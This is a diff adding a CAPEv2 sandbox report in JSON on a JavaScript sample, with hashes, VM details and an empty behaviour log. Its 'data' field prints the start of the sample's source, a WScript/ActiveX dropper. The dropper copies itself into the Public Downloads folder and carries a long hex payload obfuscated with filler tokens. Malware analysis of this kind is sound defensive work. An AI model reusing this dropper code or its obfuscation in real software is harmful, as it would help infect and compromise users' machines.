@@ -1,0 +1,154 @@
+{
+  "statistics": {
+    "processing": [
+      {
+        "name": "DecryptPcap",
+        "time": 0.0
+      },
+      {
+        "name": "CAPE",
+        "time": 0.804
+      },
+      {
+        "name": "AnalysisInfo",
+        "time": 0.037
+      },
+      {
+        "name": "BehaviorAnalysis",
+        "time": 0.002
+      },
+      {
+        "name": "Debug",
+        "time": 0.001
+      },
+      {
+        "name": "NetworkAnalysis",
+        "time": 0.0
+      },
+      {
+        "name": "UrlAnalysis",
+        "time": 0.0
+      },
+      {
+        "name": "script_log_processing",
+        "time": 0.0
+      },
+      {
+        "name": "ProcessMemory",
+        "time": 0.0
+      }
+    ],
+    "signatures": [],
+    "reporting": [
+      {
+        "name": "BinGraph",
+        "time": 0.0
+      }
+    ]
+  },
+  "decryptpcap": {},
+  "target": {
+    "category": "file",
+    "file": {
+      "name": "39de38944110748fca8c0.js",
+      "path": "/opt/CAPEv2/storage/binaries/39de38944110748fca8c0c971f7399dfda4c0834f2c7008cbd9e3b5d54936e06",
+      "guest_paths": "",
+      "size": 266834,
+      "crc32": "C6DBB363",
+      "md5": "530fa158fd6ade8d0fa457dfabd94048",
+      "sha1": "01d98c5c39ffa5243325a40df4850d24288c1edc",
+      "sha256": "39de38944110748fca8c0c971f7399dfda4c0834f2c7008cbd9e3b5d54936e06",
+      "sha512": "936416d5ed499fe130d9c6b38ed3e41dee77d952c117e4666c2388d973b5b19e4493d1961a3dcf47c84f416b24455037de64b215d8116a7446ed480ce6ddea04",
+      "rh_hash": null,
+      "ssdeep": "384:Fi2IBNXfcbS9JelbDNIu6YKQT7OYB7WRaNwsuP8YOCDROhS9JeOi2IBNiwOul8Q2:Lw",
+      "type": "ASCII text, with very long lines (65058), with CRLF line terminators",
+      "yara": [],
+      "cape_yara": [],
+      "clamav": [],
+      "tlsh": "T164441A2D6EC685670CA451C3AFB44FF4B4622B0550B47B092F0A29662F57F39276B8FC",
+      "sha3_384": "e95dcbd008f0be6affaff20024001c95743c0ea0752d02a872ec3b92a1bec44799f94b79bc442beeaa5fd09d17b6651d",
+      "yara_hash": "0e29e1704625e93af27445e01f64a7539da7e965621eefc136f40958e4f795db",
+      "options_hash": "44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a",
+      "data": "var ligularia = new ActiveXObject(\"Scripting.FileSystemObject\");\r\nvar shell = new ActiveXObject(\"WScript.Shell\");\r\nvar paraphrenia = WScript.ScriptFullName;\r\nvar ziczac = \"Name_File.js\";\r\nvar informatics = \"C:\\\\Users\\\\Public\\\\Downloads\\\\\" + ziczac;\r\nif (!ligularia.FileExists(informatics)) {\r\n    ligularia.CopyFile(paraphrenia, informatics, true);\r\n}\r\n\r\n\r\n\r\nfunction tchicked(spawld, protonate, rhabditiform){\r\n  return protonate + spawld.slice(1) + rhabditiform;\r\n}\r\n\r\ntry {\r\n    var gurrybutt = \"2tubul4tubul6tubul6tubul5tubul0tubul6tubul5tubul7tubul8tubul4tubulAtubul4tubul7tubul3tubul3tubul7tubul4tubul7tubul0tubul3tubul2tubul4tubul3tubul4tubulFtubul3tubul4tubul6tubul1tubul5tubul6tubul5tubul7tubul4tubul2tubul5tubul4tubul5tubul9tubul5tubul4tubul6tubul9tubul6tubul8tubul7tubul5tubul3tubul2tubul6tubulDtubul5tubul7tubul4tubul7tubul5tubul5tubul3tubul3tubul7tubulAtubul3tubul9tubul5tubul4tubul7tubul5tubul6tubulAtubul5tubul0tubul4tubulCtubul6tubul1tubul5tubul1tubul3tubul6tubul5tubul3tubul4tubulAtubul4tubul7tubul4tubul6tubul4tubul2tubul5tubul9tubul6tubulDtubul4tubul1tubul7tubulAtubul3tubul7tubul6tubulEtubul4tubulDtubul5tubulAtubul4tubul3tubul3tubul3tubul7tubul8tubul7tubul3tubul7tubul8tubul4tubulCtubul7tubulAtubul3tubul6tubul4tubul8tubul5tubulAtubul6tubulAtubul6tubul6tubul3tubul7tubul6tubulFtubul6tubul5tubul4tubulCtubul6tubul3tubul3tubul5tubul5tubul3tubul6tubul7tubul6tubul5tubul5tubul5tubul4tubulBtubul5tubul7tubul4tubulDtubul3tubul8tubul6tubulAtubul3tubul7tubul4tubulFtubul7tubul6tubul6tubul4tubul4tubulEtubul3tubul8tubul6tubulBtubul5tubul2tubul3tubul6tubul4tubul9tubul4tubulDtubul4tubul2tubul3tubul8tubul4tubul7tubul7tubul5tubul5tubul7tubul6tubul1tubul6tubul1tubul4tubul3tubul4tubulAtubul7tubul1tubul4tubul9tubul4tubulBtubul5tubul3tubul7tubul6tubul4tubulAtubul3tubul6tubul6tubul1tubul4tubul3tubul4tubul6tubul3tubul7tubul4tubulCtubul7tubul8tubul7tubulAtubul4tubul1tubul3tubul6tubul6tubulFtubul7tubul1tubul4tubulAtubul6tubul5tubul6tubul3tubul6tubulBtubul3tubul5tubul4tubulBtubul4tubul7tubul3tubul7tubul6tubulAtubul5tubulAtubul6tubul6tubul6tubulCtubul5tubul8tubul6tubulFtubul6tubulFtubul3tubul3tubul7tubul3tubul4tubul7tubul5tubul0tubul7tubul8tubul4tubulAtubul3tubul2tubul4tubulEtubul5tubul8tubul6tubulCtubul4tubulDtubul7tubulAtubul3tubul6tubul7tubul9tubul5tubul2tubul6tubulDtubul3tubul0tubul4tubul2tubul4tubulDtubul4tubul5tubul6tubul1tubul6tubulAtubul6tubul5tubul3tubul5tubul6tubul6tubul4tubul2tubul7tubul4tubul5tubul2tubul4tubulAtubul6tubul1tubul5tubul3tubul7tubul9tubul6tubul6tubul7tubulAtubul4tubul7tubul4tubul7tubul6tubul8tubul7tubul2tubul7tubul6tubul4tubul5tubul5tubul5tubul5tubul5tubul5tubul3tubul3tubul3tubul5tubulAtubul4tubul8tubul6tubulDtubul4tubul3tubul6tubulAtubul7tubul8tubul4tubul5tubul6tubulCtubul7tubul0tubul5tubulAtubul4tubul2tubul4tubul2tubul5tubul0tubul5tubul0tubul3tubul2tubul7tubul6tubul4tubul8tubul4tubul6tubul4tubul3tubul6tubul6tubul4tubul1tubul7tubul3tubul7tubul4tubul6tubulEtubul6tubulDtubul7tubul0tubul3tubulDtubul2tubul7tubul6tubul8tubul7tubul4tubul7tubul4tubul7tubul0tubul7tubul3tubul3tubulAtubul2tubulFtubul2tubulFtubul7tubul5tubul6tubulEtubul6tubul6tubul6tubul1tubul6tubul9tubul7tubul2tubul2tubulDtubul6tubul2tubul6tubul1tubul7tubul3tubul6tubul9tubul6tubulCtubul6tubul9tubul7tubul3tubul6tubulBtubul2tubulDtubul3tubul3tubul7tubul9tubul7tubul8tubul7tubul4tubul3tubul2tubul2tubulEtubul6tubulCtubul6tubul9tubul6tubul7tubul6tubul8tubul7tubul4tubul6tubul8tubul6tubulFtubul7tubul5tubul7tubul3tubul6tubul5tubul7tubul7tubul6tubul5tubul6tubul2tubul3tubul3tubul2tubulEtubul7tubul8tubul7tubul9tubul7tubulAtubul2tubulFtubul6tubul9tubul7tubul0tubul6tubul6tubul7tubul3tubul2tubulFtubul6tubul2tubul6tubul1tubul6tubul6tubul7tubul9tubul6tubul2tubul6tubul5tubul6tubul9tubul6tubul4tubul7tubul4tubul3tubul6tubul3tubul7tubul3tubul6tubul6tubulBtubul3tubul2tubul6tubul8tubul6tubulCtubul3tubul7tubul6tubul2tubul3tubul7tubul6tubul1tubul7tubul9tubul7tubul3tubul7tubul0tubul7tubul7tubul7tubul0tubul7tubul8tubul6tubul1tubul6tubul5tubul7tubul8tubul7tubul3tubul3tubul3tubul6tubul1tubul6tubul4tubul6tubul7tubul7tubul7tubul3tubul5tubul6tubulAtubul7tubul9tubul7tubul4tubul3tubul7tubul6tubul5tubul3tubul2tubul6tubul6tubul3tubul6tubul3tubul2tubul7tubul5tubul3tubul3tubul6tubul2tubul6tubul6tubul6tubulAtubul6tubul5tubul3tubul3tubul7tubul0tubul6tubulBtubul3tubul5tubul7tubul5tubul3tubul3tubul6tubulFtubul7tubul5tubul2tubul7tubul3tubulBtubul0tubulDtubul0tubulAtubul0tubulDtubul0tubulAtubul0tubulDtubul0tubulAtubul0tubulDtubul0tubulAtubul2tubul4tubul6tubul1tubul6tubulBtubul5tubul6tubul3tubul2tubul4tubul3tubul4tubul1tubul4tubulDtubul6tubul1tubul7tubul0tubul6tubul8tubul7tubul8tubul4tubulBtubul5tubul5tubul6tubulBtubul4tubulFtubul6tubul6tubul7tubul9tubul6tubulFtubul4tubul2tubul7tubulAtubul6tubul2tubul5tubul8tubul4tubul7tubul4tubul7tubul5tubul9tubul6tubul4tubul7tubul8tubul5tubul8tubul4tubulCtubul3tubul7tubul4tubulFtubul7tubul9tubul3tubul0tubul4tubulFtubul3tubul9tubul6tubul6tubul5tubul2tubul7tubul1tubul7tubul2tubul7tubul1tubul6tubulDtubul3tubul7tubul3tubul0tubul4tubulCtubul3tubul1tubul4tubul8tubul3tubul6tubul4tubulFtubul6tubul5tubul5tubul5tubul5tubul2tubul4tubul1tubul6tubul7tubul3tubul3tubul4tubul9tubul4tubulEtubul5tubul0tubul5tubul5tubul7tubul2tubul5tubul7tubul6tubulFtubul3tubul8tubul6tubul2tubul3tubul7tubul7tubul8tubul4tubulAtubul4tubulAtubul4tubulCtubul6tubulEtubul6tubulDtubul5tubul8tubul4tubul6tubul3tubul0tubul6tubul5tubul6tubulCtubul6tubulAtubul6tubul3tubul4tubul6tubul6tubul7tubul7tubul8tubul4tubul3tubul4tubul8tubul7tubul4tubul5tubulAtubul7tubul9tubul3tubul9tubul6tubulEtubul4tubul7tubul3tubul6tubul5tubulAtubul6tubulBtubul6tubulBtubul6tubulDtubul6tubulBtubul7tubul2tubul5tubulAtubul6tubulAtubul4tubul8tubul5tubul3tubul6tubulBtubul6tubul8tubul3tubul1tubul5tubulAtubul4tubulDtubul5tubul4tubul6tubulDtubul6tubul2tubul7tubul6tubul6tubulAtubul6tubul6tubul4tubul3tubul5tubul0tubul5tubulAtubul7tubul8tubul5tubul4tubul3tubul7tubul3tubul3tubul3tubul3tubul5tubul3tubul4tubulDtubul7tubul9tubul4tubul5tubul4tubulFtubul5tubul4tubul5tubul7tubul7tubul8tubul4tubulFtubul4tubul4tubul7tubul8tubul3tubul3tubul4tubul2tubul3tubul3tubul3tubul3tubul6tubul5tubul6tubulEtubul6tubulAtubul6tubul3tubul6tubulDtubul4tubul6tubul7tubul9tubul6tubul8tubul4tubulFtubul5tubul3tubul7tubul0tubul7tubul0tubul6tubul4tubul4tubul1tubul4tubul8tubul7tubul8tubul4tubul5tubul4tubulFtubul6tubulDtubul4tubul8tubul5tubul2tubul3tubul6tubul7tubul8tubul7tubul3tubul7tubul2tubul5tubul0tubul6tubul8tubul5tubulAtubul5tubul8tubul6tubulAtubul4tubul7tubul6tubul6tubul4tubul2tubul4tubul3tubul4tubulDtubul3tubul5tubul4tubulEtubul3tubul3tubul3tubul8tubul4tubulDtubul6tubulFtubul4tubul2tubul7tubulAtubul6tubulDtubul3tubul6tubul7tubul1tubul4tubulFtubul5tubul3tubul6tubul5tubul6tubul5tubul4tubulBtubul5tubul6tubul6tubul8tubul5tubul3tubul4tubulCtubul6tubul1tubul3tubul4tubul5tubul0tubul7tubul4tubul6tubul4tubul6tubul5tubul5tubul4tubul7tubul2tubul3tubul9tubul7tubul0tubul6tubulDtubul3tubulDtubul4tubulEtubul6tubul5tubul7tubul7tubul2tubulDtubul4tubulFtubul6tubul2tubul6tubulAtubul6tubul5tubul6tubul3tubul7tubul4tubul2tubul0tubul4tubulEtubul6tubul5tubul7tubul4tubul2tubulEtubul5tubul7tubul6tubul5tubul6tubul2tubul4tubul3tubul6tubulCtubul6tubul9tubul6tubul5tubul6tubulEtubul7tubul4tubul3tubulBtubul0tubulDtubul0tubulAtubul0tubulDtubul0tubulAtubul0tubulDtubul0tubulAtubul0tubulDtubul0tubulAtubul2tubul4tubul5tubul7tubul4tubulDtubul7tubul2tubul4tubulAtubul5tubulAtubul7tubul0tubul5tubul4tubul4tubulEtubul4tubul1tubul7tubul1tubul3tubul3tubul5tubul0tubul4tubul4tubul6tubulFtubul5tubul3tubul6tubul1tubul5tubul4tubul3tubul3tubul6tubul1tubul3tubul1tubul7tubul1tubul6tubul4tubul4tubulAtubul7tubul7tubul5tubul7tubul4tubulEtubul4tubulCtubul4tubul3tubul4tubulFtubul3tubul7tubul3tubul7tubul4tubul6tubul4tubul3tubul5tubul5tubul4tubulAtubul3tubul0tubul6tubulFtubul7tubul8tubul6tubul7tubul4tubul9tubul3tubul0tubul4tubulAtubul5tubul2tubul5tubul1tubul3tubul5tubul6tubul3tubul5tubul0tubul6tubulAtubul3tubul1tubul6tubulAtubul5tubul2tubul3tubul0tubul3tubul7tubul3tubul1tubul6tubul1tubul4tubulEtubul6tubul7tubul4tubul2tubul6tubul8tubul5tubul8tubul7tubul1tubul5tubul6tubul7tubul2tubul6tubul7tubul6tubulAtubul7tubul8tubul7tubul1tubul4tubul5tubul4tubul3tubul5tubul0tubul5tubul0tubul6tubulDtubul4tubul4tubul5tubul0tubul6tubul2tubul7tubul5tubul6tubul2tubul6tubul1tubul6 <truncated>",
+      "strings": [],
+      "virustotal": {
+        "error": true,
+        "msg": "Unable to complete connection to VirusTotal. Status code: 429"
+      },
+      "executed_tools": [
+        "msi_extract",
+        "overlay",
+        "kixtart_extract",
+        "vbe_extract",
+        "batch_extract",
+        "UnAutoIt_extract",
+        "UPX_unpack",
+        "RarSFX_extract",
+        "Inno_extract",
+        "SevenZip_unpack",
+        "de4dot_deobfuscate",
+        "eziriz_deobfuscate",
+        "office_one"
+      ],
+      "cape_type_code": 0,
+      "cape_type": ""
+    }
+  },
+  "CAPE": {
+    "payloads": [],
+    "configs": []
+  },
+  "info": {
+    "version": "2.5",
+    "started": "2026-04-12 13:31:09",
+    "ended": "2026-04-12 13:36:00",
+    "duration": 291,
+    "id": 18,
+    "category": "file",
+    "custom": "",
+    "machine": {
+      "id": 12,
+      "status": "starting",
+      "name": "cuckoo1",
+      "label": "cuckoo1",
+      "platform": "windows",
+      "manager": "KVM",
+      "started_on": "2026-04-12 13:31:09",
+      "shutdown_on": "2026-04-12 13:35:59"
+    },
+    "package": "js",
+    "timeout": false,
+    "tlp": null,
+    "parent_sample": {
+      "id": 11,
+      "file_size": 21302,
+      "file_type": "Zip archive data, at least v5.1 to extract, compression method=AES Encrypted",
+      "md5": "9ff4166a91abebd222988c86e443b3b4",
+      "crc32": "89AD0F55",
+      "sha1": "a58ea824990e75bb3e8ffca6450100af77a752bc",
+      "sha256": "10cc06c109946b878e72b705f4cd85abbe67846886536d9aeef302aaed4eaf07",
+      "sha512": "a825cca2dc9d75ce291e4a41c82fea54932836333f52ca4bf52d882d7d0d5107e7dbb0ebd8866f0820e134deac80b580c4284cc9b8a8313d295977e82953a6e1",
+      "ssdeep": null,
+      "source_url": null
+    },
+    "options": {},
+    "source_url": null,
+    "route": "none",
+    "user_id": 0,
+    "CAPE_current_commit": "35a362e838e289987267a10c6a0880bf30c5dc99"
+  },
+  "behavior": {
+    "processes": []
+  },
+  "debug": {
+    "log": "",
+    "errors": []
+  },
+  "network": {},
+  "url_analysis": {},
+  "procmemory": [],
+  "signatures": [],
+  "malscore": 0.0,
+  "ttps": [],
+  "malstatus": null
+}
